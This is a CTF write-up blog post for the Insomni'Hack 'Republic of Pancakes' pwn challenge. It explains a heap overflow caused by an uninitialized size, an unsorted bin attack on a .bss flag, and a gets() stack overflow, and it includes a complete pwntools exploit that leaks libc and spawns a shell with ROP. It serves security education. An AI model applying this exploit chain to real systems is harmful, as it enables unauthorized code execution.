---
layout: post
title: Insomni'Hack CTF - Republic of Pancakes
category: ctf
tags: [ctf, pwn, exploitation, heap, rop, stack]
disqus: y
---

## Intro

Some informations about our target binary:

```sh
$ file rop                                                                 
rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a323ee2288744966a2dd2f942b4327541e767505, stripped
```

```
$ checksec --file=rop         
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               4               rop
```               

If we run it we are prompted with a simple user interface:
```
*------------------------------*
            Welcome to                    
    The Republic of Pancake     
*------------------------------*
 1. Create a menu               
 2. Edit a menu                 
 3. Delete a menu               
 4. I'm full!                   
*------------------------------*
your choice: 
```           

With such app we can create, edit and delete menus. Each menu consists of a simple string describing its ingredients.
The app can take at most 10 menu's and depending on the menu type the string size differs.
When deleting a menu the ingredients string is freed and the entry is set to NULL.
There is an hidden feature to collect the user feedback under the code `1234` which is by default not enabled.

After some analysis we found **two** different vulnerabilities that we need to chain together to get our shell. An heap buffer overflow is present when editing the menu and allows to overflow the ingredients string. A stack buffer overflow is present in the (hidden) collect feedback code where a stack buffer of fix size can be overflown.

## Heap Buffer Overflow

Lets see what kind of menus we can allocate. We can select across three different menu types having different memory sizes.
Depending on this size they will land into different heap buckets.

| ID      | Type                 | Size    | Heap Bucket  |
|:---------|:----------------------|:---------|:--------------|
| 0x1     | Mini PANCAKE         | 0x20    | Fast-bin |
| 0x2     | Big PANCAKE          | 0x40    | Fast-bin |
| 0x3     | Big PANCAKE + Coffee | 0x80    | Small-bin / Unsorted bin |

The heap vulnerability is in the edit menu function, from the code below we see that, based on the menu choice of the user, the size of the menu is assigned.

```cpp
int edit_menu()
{
  int new_idx; // eax
  signed int menu_idx; // [rsp+4h] [rbp-Ch]
  size_t menu_size; // [rsp+8h] [rbp-8h] -> not initialized!

  printf("Please enter your menu to edit : ");
  menu_idx = read_int();
  if ( (unsigned int)menu_idx >= 0xA )
    error("Sorry - out of bound!");
  if ( !*(&menu_ptr + menu_idx) )
    return puts("Oops! This menu doesn't exist.");
  print_menu_choice("Which menu do you want to create?");
  printf("Please enter your choice: ");
  new_idx = read_int();
  switch ( new_idx )
  {
    case 2:
      menu_size = 0x40LL;
      break;
    case 3:
      menu_size = 0x80LL;
      break;
    case 1:
      menu_size = 0x20LL;
      break;
  }
  printf("Please enter your pancake ingredients: ");
  return enter_pancake_ingredients(*(&menu_ptr + menu_idx), menu_size);
}
```
But what happens if the menu type is not within the [1-3] range? There is no `default` switch condition nor is the `size` variable initialized.
This means that whatever is at `rbp-8` will be used as `menu_size`. Luckily this happens to be a very large value (a pointer inside `libc`, a leftover on the stackframe from a previous call?).
We endup in the `enter_pancake_ingredients` function and ultimately to a `read()` of size `0x7FBFA3E51A40` that will fill our string buffer.

As already anticipated, in the application there is an hidden feature that can be enabled only via a flag (a qword that we call `special_feature`) that resides in the `.bss` section and is set to zero. 

```
.bss:00000000006020D0 00 00 00 00 00 +special_feature dq 0 
```

In order to pass the check we need to set a value of at least `0x3039`. But there are no code-paths that allows us to change this value (no xref found). Therefore the only feasible way is via a our heap overflow vulnerability.

```cpp
if ( choice == 1234 )
{
    if ( special_feature >= 0x3039 )
        puts("/!\\ This functionality is not yet available!");
    else
        collect_feedback_sof();
}
```

After reviewing the different techniques on [how2heap](https://github.com/shellphish/how2heap) there was a simple one that matched our scenario perfectly.
The idea is to use the [unsorted bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/unsorted_bin_attack.c) which allows us to write a very large value in an arbitrary location by exploiting how the unsorted bin list behaves.

The strategy is the following:
* We allocate a chunk `p1` with a size big enough to land in small bin (`0x80` in our case)
* We allocate another chunk in order to avoid consolidating the top chunk with the first one during the `free()` (another `0x80` chunk)
* We `free()` that first chunk `p1`
* We modify the backward pointer of the chunk with our overflow to point to our target address-0x10
* We allocate a new chunk and cause the write to the backward pointer location (our target) to happen

What ends up in the target address is nothing else than a pointer inside libc which points to the top chunk. 
So we set as target address our special flag qword at `0x6020D0` and we will end up with something definitely bigger then `0x3039`.

## Stack Overflow

Once we reach the collect feedback code a very 101 stack-buffer overflow vulnerability stands out.
```cpp
__int64 collect_feedback_sof()
{
  char v1[128]; // [rsp+0h] [rbp-80h] BYREF

  puts("Thank you for submitting your feedback.");
  return gets(v1);
}
```

The idea is overflow the return address and execute a ROP that will spawn a shell.
In order to have more gadgets we want to leak the libc base address since the target is not PIE but libc is!

To do so we create a simple rop that leak the `printf` address from the ELF GOT table.
From there we can then compute the offset to the libc base address.

```py
fill_up_buffer = "a" * 128 + "b" * 8

p.sendline("1234")

rop = ROP(elf)
rop.raw(fill_up_buffer)
# lets write printf@GOT to stdout
rop.puts(elf.got["printf"])
# we return to main so we can continue with our exploit chain
rop.call(elf.entry)
p.sendline(rop.chain())
p.recvuntil("feedback.\n")

packed_printf_address = p.recvline()[:-1]
printf_address = unpack(packed_printf_address.ljust(8, b"\x00"))
libc.address = printf_address - libc.symbols["printf"]
```

Once we have the base, we can simply ask for the shell.
```py
p.sendline("1234")
rop = ROP(libc)
rop.raw(fill_up_buffer)
rop.system(next(libc.search(b'/bin/sh')))
p.sendline(rop.chain())
```

## Final Exploit

To test the exploit we used a docker ubuntu:16.04 image so that we could preload the provided `libc-2.23.so`.
```
docker run -ti -p 1337:1337 -p 23946:23946 --name pwn -v /home/kali/Desktop/pancake:/pancake ubuntu:16.04
```

On the docker we used socat to expose the CLI to the outside:
```
LD_PRELOAD=/pancake/libc-2.23.so socat tcp-listen:1337,fork exec:/pancake/rop
```

Here the final python code:

```py
from pwn import *
import struct
import sys

LOCAL_LIBC_PATH = "/home/kali/Desktop/pancake/libc-2.23.so"

elf = ELF("rop")
libc = ELF(LOCAL_LIBC_PATH)
context.binary = elf

#context.update(arch='i386', os='linux')

#p = process("/home/kali/Desktop/pancake/rop")

p = remote('127.0.0.1',1337)

def create_menu(content):
    p.sendline(b"1")
    p.recvuntil(b"Please enter your choice: ")
    if len(content) >= 0x80:
        p.sendline(b"3") 
    elif len(content) >= 0x40:
        p.sendline(b"2")
    elif len(content) >= 0x20:
        p.sendline(b"1")
    else:
        print("Size not existing!")
        return
    p.recvuntil(b"Please enter your pancake ingredients: ")
    p.sendline(content)
    p.recvuntil(b"your choice: ")

def free_menu(idx):
    p.sendline(b"3")
    p.recvuntil(b"Please enter the menu to delete: ")
    p.sendline(idx)
    p.recvuntil(b"your choice: ")

p.recvuntil(b"your choice: ")
create_menu(b"A" * 0x80)
create_menu(b"B" * 0x80)
create_menu(b"C" * 0x40)
free_menu(b"1")
# unsorted bin attack
target = 0x6020d0 # special_flag
p.sendline(b"2")
p.recvuntil(b"Please enter your menu to edit : ")
p.sendline(b"0")
p.recvuntil(b"Please enter your choice: ")
p.sendline(b"0")
buf = b"D" * 0x83 # why 0x83?
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", 0x91)
buf += struct.pack("<Q", 0x0)
buf += struct.pack("<Q", target-0x10)
buf += b"E" * 0x8
p.sendline(buf)
p.recvuntil(b"your choice: ")
#p.interactive()
# now lets trigger the write by allocating a new menu
create_menu("A" * 0x80)

fill_up_buffer = "a" * 128 + "b" * 8

#################
# leak libc address
#################
p.sendline(b"1234")
rop = ROP(elf)
rop.raw(fill_up_buffer)
rop.puts(elf.got["printf"])
rop.call(elf.entry)
#print(rop.dump())
p.sendline(rop.chain())
p.recvuntil(b"feedback.\n")

packed_printf_address = p.recvline()[:-1]
printf_address = unpack(packed_printf_address.ljust(8, b"\x00"))
libc.address = printf_address - libc.symbols["printf"]

#################
# get a shell
#################
p.sendline(b"1234")
rop = ROP(libc)
rop.raw(fill_up_buffer)
rop.system(next(libc.search(b'/bin/sh')))
#print(rop.dump())

p.sendline(rop.chain())

p.interactive()
```

## Demo

[![asciicast](https://asciinema.org/a/N8uktcUEMuGsdeLYdcqk7vbRL.svg)](https://asciinema.org/a/N8uktcUEMuGsdeLYdcqk7vbRL)